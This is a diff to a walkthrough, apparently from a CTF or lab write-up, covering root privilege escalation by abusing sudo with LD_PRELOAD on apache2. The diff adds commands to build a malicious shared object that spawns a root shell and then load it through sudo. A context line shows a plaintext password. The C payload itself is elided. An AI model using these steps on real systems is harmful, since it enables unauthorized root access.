@@ -289,19 +289,19 @@ password123
 
 ### Step 1 — Create malicious shared object
 ```bash
-
+cat << 'EOF' > x.c ... EOF
 ```
 Creates a C file that spawns a root shell when loaded.
 
 ### Step 2 — Compile
 ```bash
+gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles
 ```
-`gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
-
 Compiles the C file into a shared library (.so) for LD_PRELOAD injection.
 
 ### Step 3 — Execute with sudo
 ```bash
+sudo LD_PRELOAD=/tmp/x.so apache2
 ```
 Forces Apache to load your malicious `.so` file before executing.
 
